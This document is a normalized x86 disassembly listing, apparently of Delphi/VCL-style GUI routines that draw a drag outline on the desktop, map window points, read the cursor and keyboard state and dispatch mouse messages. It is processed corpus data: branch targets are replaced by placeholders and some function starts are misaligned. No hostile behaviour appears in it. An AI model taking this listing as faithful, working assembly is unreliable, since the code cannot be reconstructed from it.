setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_4034e4
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_4034e4
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_4406d4
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_440720
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_44076c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_440887
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_420c6c
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44088e
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_4408c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403474
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_43f7f4
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403498
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_4034e4
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_4034e4
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_4034e4
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_4034e4
jmp r-xdata
sub_4409b0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416114
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_440e98
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43fc40
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_43fc54
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_416164
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_440b90
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_43f7c8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_4034e4
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_4464d0
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d3c4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_440b7b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_4464d0
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4464d0
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43f650
test esi esi
je r-xdata
sub_440b90
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_4034e4
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_441a14
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4034e4
mov eax esi
call sub_43f6f8
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_43f6b4
mov ecx eax
xor edx edx
xor eax eax
call sub_41613c
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4034e4
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_440c34
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_440c64
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_440cd0
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_440d90
sub_440d00
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_440d30
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_43f7f4
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_440d5c
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_440d90
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_440e64
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_440e98
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_440f30
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_456c04
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_456c04
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43f850
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_4603b0
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_4034e4
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_456b48
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_4034e4
jmp r-xdata
sub_4410c4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408a5c
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408a88
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43f850
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_4088b4
call sub_408824
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408824
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_44116c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_44119c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_441160
push ebp
call sub_44116c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4411ec
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_441278
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_4412b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_440d30
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_456ab8
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4034e4
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_456ab8
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4034e4
sub_441334
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43f820
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43fee8
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_4412b0
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_441380
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43f820
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44139c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43f820
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43fee8
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4412b0
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_4034e4
sub_4413f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_440cd0
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_440c64
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_440cd0
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_441490
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4412b0
pop esi
pop ebx
retn
sub_4414b5
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4412b0
pop esi
pop ebx
retn
sub_4414db
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4412b0
pop esi
pop ebx
retn
sub_441505
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4412b0
pop esi
pop ebx
retn
sub_44152b
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_441560
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_440d30
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_456ab8
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_4034e4
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_456ab8
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_4034e4
sub_4415d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_441610
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_456ab8
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_4034e4
sub_441648
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_43fee8
mov edx edi
xor ecx ecx
mov eax ebx
call sub_441610
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406cec
push [ esp + 0x4 ]
push [ esp + 0x4 ]
